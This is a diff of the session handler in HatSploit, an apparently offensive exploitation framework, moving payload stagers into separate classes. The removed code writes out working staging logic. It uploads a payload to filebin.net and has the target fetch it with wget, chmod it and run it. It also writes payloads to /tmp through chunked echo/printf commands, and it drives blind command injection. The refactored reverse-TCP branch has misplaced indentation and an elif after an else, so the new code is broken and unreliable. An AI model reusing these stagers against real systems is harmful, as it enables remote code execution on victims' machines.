@@ -24,10 +24,6 @@
 # SOFTWARE.
 #
 
-import os
-import requests
-import binascii
-
 from hatsploit.lib.sessions import Sessions
 from hatsploit.lib.storage import LocalStorage
 from hatsploit.core.cli.badges import Badges
@@ -37,6 +33,12 @@ from hatsploit.lib.server import Server
 
 from hatsploit.lib.session import Session
 from hatsploit.utils.telnet import TelnetClient
+
+from hatsploit.core.handler.stages.echo import EchoStage
+from hatsploit.core.handler.stages.printf import PrintfStage
+from hatsploit.core.handler.stages.wget import WgetStage
+
+from hatsploit.core.handler.blinder import Blinder
 
 
 class HatSploitSession(Session, TelnetClient):
@@ -67,23 +69,8 @@ class Handler(Server):
     modules = Modules()
     jobs = Jobs()
     badges = Badges()
-
-    def blinder(self, sender, args=[]):
-        self.print_empty()
-        self.print_information("Welcome to Blinder, blind command injection handler.")
-        self.print_information("Blinder is not a reverse shell, just a blind command injection.")
-        self.print_empty()
-
-        while True:
-            command = self.input_empty("blinder > ")
-            if not command.strip() or command == 'exit':
-                return
-
-            self.print_process("Sending command to target...")
-            output = sender(*args, command)
-            if output:
-                self.print_empty(f'\n{output}')
-            self.print_empty('')
+    
+    blinder = Blinder()
 
     def listen_session(self, local_host, local_port, timeout=None, session=HatSploitSession):
         try:
@@ -104,95 +91,6 @@ class Handler(Server):
         except Exception:
             self.badges.print_error("Failed to handle session!")
             return None
-
-    def bytes_to_octal(self, bytes_obj):
-        byte_octals = []
-        for byte in bytes_obj:
-            byte_octal = '\\' + oct(byte)[2:]
-            byte_octals.append(byte_octal)
-        return ''.join(byte_octals)
-
-    def wget_stage(self, payload, sender, args=[], payload_args="", delim=';',
-                   location='/tmp'):
-        self.badges.print_process("Sending payload stage...")
-        filename = binascii.hexlify(os.urandom(8)).decode()
-        path = location + '/' + filename
-
-        wget_bin = binascii.hexlify(os.urandom(8)).decode()
-        wget_file = binascii.hexlify(os.urandom(8)).decode()
-        
-        wget_container = f"https://dev.filebin.net/{wget_bin}"
-        wget_server = f"https://dev.filebin.net/{wget_bin}/{wget_file}"
-
-        wget_stream = "wget '{}' -qO {}"
-
-        requests.post(wget_server.format(wget_bin, wget_file), data=payload)
-        self.badges.print_process("Uploading payload...")
-
-        self.badges.print_process("Executing payload...")
-        command = f"{wget_stream.format(wget_server, path)} {delim} chmod 777 {path} {delim} sh -c \"{path} {payload_args} &\" {delim} rm {path}"
-        args = args if args is not None else ""
-
-        sender(*args, {command})
-        requests.delete(wget_container)
-
-    def echo_stage(self, payload, sender, args=[], payload_args="", delim=';',
-                   location='/tmp', linemax=100):
-        self.badges.print_process("Sending payload stage...")
-        filename = binascii.hexlify(os.urandom(8)).decode()
-        path = location + '/' + filename
-
-        echo_stream = "echo -en '{}' >> {}"
-        echo_max_length = linemax
-
-        size = len(payload)
-        num_parts = int(size / echo_max_length) + 1
-
-        for i in range(0, num_parts):
-            current = i * echo_max_length
-            block = self.bytes_to_octal(payload[current:current + echo_max_length])
-            if block:
-                command = echo_stream.format(block, path)
-
-                self.badges.print_multi(f"Uploading payload... ({str(current)}/{str(size)})")
-                sender(*args, command)
-
-        self.badges.print_process("Executing payload...")
-        args = args if args is not None else ""
-
-        sender(*args, f"chmod 777 {path} {delim} sh -c \"{path} {payload_args} &\" {delim} rm {path}")
-    
-    def printf_stage(self, payload, sender, args=[], payload_args="", delim=';',
-                     location='/tmp', linemax=100):
-        self.badges.print_process("Sending payload stage...")
-        filename = binascii.hexlify(os.urandom(8)).decode()
-        path = location + '/' + filename
-
-        printf_stream = "printf '{}' >> {}"
-        printf_max_length = linemax
-
-        size = len(payload)
-        num_parts = int(size / printf_max_length) + 1
-
-        for i in range(0, num_parts):
-            current = i * printf_max_length
-            block = self.bytes_to_octal(payload[current:current + printf_max_length])
-            if block:
-                command = printf_stream.format(block, path)
-
-                self.badges.print_multi(f"Uploading payload... ({str(current)}/{str(size)})")
-                sender(*args, command)
-
-        self.badges.print_process("Executing payload...")
-        args = args if args is not None else ""
-
-        sender(*args, f"chmod 777 {path} {delim} sh -c \"{path} {payload_args} &\" {delim} rm {path}")
-
-    def raw_stage(self, payload, sender, args=[]):
-        self.badges.print_process("Sending payload stage...")
-        self.badges.print_process("Executing payload...")
-
-        sender(*args, payload)
 
     def set_session_details(self, payload, session):
         if not session.details['Type']:
@@ -218,6 +116,15 @@ class Handler(Server):
                 args
             )
 
+    def raw_stage(self, payload, sender, args=[]):
+        self.badges.print_process("Sending payload stage...")
+        self.badges.print_process("Executing payload...")
+
+        sender(*args, payload)
+
+    def blinder(self, sender, args=[]):
+        self.blinder.start(sender, args)
+
     def handle_session(self, host, port, payload, sender=None, args=[],
                        delim=';', remote_host=None, location='/tmp', timeout=10,
                        method=None, manual=False, post="printf", linemax=100):
@@ -225,8 +132,13 @@ class Handler(Server):
             self.badges.print_error("Payload stage is not found!")
             return False
 
+        if post.lower() not in self.stages:
+            self.print_error("Invalid post method selected!")
+            return False
+
         if sender is not None:
             session = payload['Session'] if payload['Session'] is not None else HatSploitSession
+
             if payload['Category'].lower() == 'stager':
                 if post.lower() == 'raw':
                     if not payload['Raw']:
@@ -243,56 +155,11 @@ class Handler(Server):
                             args
                         ]
                     )
-                elif post.lower() == 'printf':
-                    self.do_job(
-                        "Handler printf Stage",
-                        payload,
-                        self.printf_stage,
-                        [
-                            payload['Payload'],
-                            sender,
-                            args,
-                            payload['Args'],
-                            delim,
-                            location,
-                            linemax
-                        ]
-                    )
-                elif post.lower() == 'echo':
-                    self.do_job(
-                        "Handler echo Stage",
-                        payload,
-                        self.echo_stage,
-                        [
-                            payload['Payload'],
-                            sender,
-                            args,
-                            payload['Args'],
-                            delim,
-                            location,
-                            linemax
-                        ]
-                    )
-                elif post.lower() == 'wget':
-                    self.do_job(
-                        "Handler wget Stage",
-                        payload,
-                        self.wget_stage,
-                        [
-                            payload['Payload'],
-                            sender,
-                            args,
-                            payload['Args'],
-                            delim,
-                            location
-                        ]
-                    )
                 else:
-                    self.print_warning("Invalid post method, using printf by default.")
                     self.do_job(
-                        "Handler printf Stage",
+                        f"Handler {post.lower()} Stage",
                         payload,
-                        self.printf_stage,
+                        self.stages[post.lower()],
                         [
                             payload['Payload'],
                             sender,
@@ -303,18 +170,23 @@ class Handler(Server):
                             linemax
                         ]
                     )
+
             elif payload['Category'].lower() == 'single':
-                self.badges.print_process("Sending payload stage...")
                 self.do_job(
-                    "Handler Stage",
+                    "Handler raw Stage",
                     payload,
-                    sender,
-                    [*args, payload['Payload']]
+                    self.raw_stage,
+                    [
+                        payload['Payload'],
+                        sender,
+                        args
+                    ]
                 )
-                self.badges.print_process("Executing payload...")
+
             else:
                 self.badges.print_error("Invalid payload category!")
                 return False
+
         else:
             if method is not None:
                 if method.lower() == 'reverse_tcp':
@@ -330,92 +202,51 @@ class Handler(Server):
 
                 if payload['Category'].lower() == 'stager':
                     if post.lower() == 'raw':
-                        if not payload['Raw']:
-                            self.badges.print_error("Payload does not support raw!")
-                            return False
+                    if not payload['Raw']:
+                        self.badges.print_error("Payload does not support raw!")
+                        return False
 
-                        self.do_job(
-                            "Handler raw Stage",
-                            payload,
-                            self.raw_stage,
-                            [
-                                payload['Raw'],
-                                sender,
-                                args
-                            ]
-                        )
-                    elif post.lower() == 'printf':
-                        self.do_job(
-                            "Handler printf Stage",
-                            payload,
-                            self.printf_stage,
-                            [
-                                payload['Payload'],
-                                new_session.send_command,
-                                args,
-                                payload['Args'],
-                                delim,
-                                location,
-                                linemax
-                            ]
-                        )
-                    elif post.lower() == 'echo':
-                        self.do_job(
-                            "Handler echo Stage",
-                            payload,
-                            self.echo_stage,
-                            [
-                                payload['Payload'],
-                                new_session.send_command,
-                                args,
-                                payload['Args'],
-                                delim,
-                                location,
-                                linemax
-                            ]
-                        )
-                    elif post.lower() == 'wget':
-                        self.do_job(
-                            "Handler wget Stage",
-                            payload,
-                            self.wget_stage,
-                            [
-                                payload['Payload'],
-                                new_session.send_command,
-                                args,
-                                payload['Args'],
-                                delim,
-                                location
-                            ]
-                        )
-                    else:
-                        self.print_warning("Invalid post method, using printf by default.")
-                        self.do_job(
-                            "Handler printf Stage",
-                            payload,
-                            self.printf_stage,
-                            [
-                                payload['Payload'],
-                                new_session.send_command,
-                                args,
-                                payload['Args'],
-                                delim,
-                                location,
-                                linemax
-                            ]
-                        )
-                elif payload['Category'].lower() == 'single':
-                    self.badges.print_process("Sending payload stage...")
                     self.do_job(
-                        "Handler Stage",
+                        "Handler raw Stage",
                         payload,
-                        new_session.send_command,
-                        [payload['Payload']]
+                        self.raw_stage,
+                        [
+                            payload['Raw'],
+                            sender,
+                            args
+                        ]
                     )
-                    self.badges.print_process("Executing payload...")
+                else:
+                    self.do_job(
+                        f"Handler {post.lower()} Stage",
+                        payload,
+                        self.stages[post.lower()],
+                        [
+                            payload['Payload'],
+                            sender,
+                            args,
+                            payload['Args'],
+                            delim,
+                            location,
+                            linemax
+                        ]
+                    )
+
+                elif payload['Category'].lower() == 'single':
+                    self.do_job(
+                        "Handler raw Stage",
+                        payload,
+                        self.raw_stage,
+                        [
+                            payload['Payload'],
+                            new_session.send_command
+                        ]
+                    )
+
                 else:
                     self.badges.print_error("Invalid payload category!")
                     return False
+
             else:
                 if manual is False:
                     self.badges.print_error("Failed to execute payload stage!")
@@ -447,3 +278,9 @@ class Handler(Server):
         session_id = self.sessions.add_session(session_platform, session_type, remote_host, port, new_session)
         self.badges.print_success("Session " + str(session_id) + " opened!")
         return True
+
+    stages = {
+        'echo': EchoStage(),
+        'printf': PrintfStage(),
+        'wget': WgetStage()
+    }
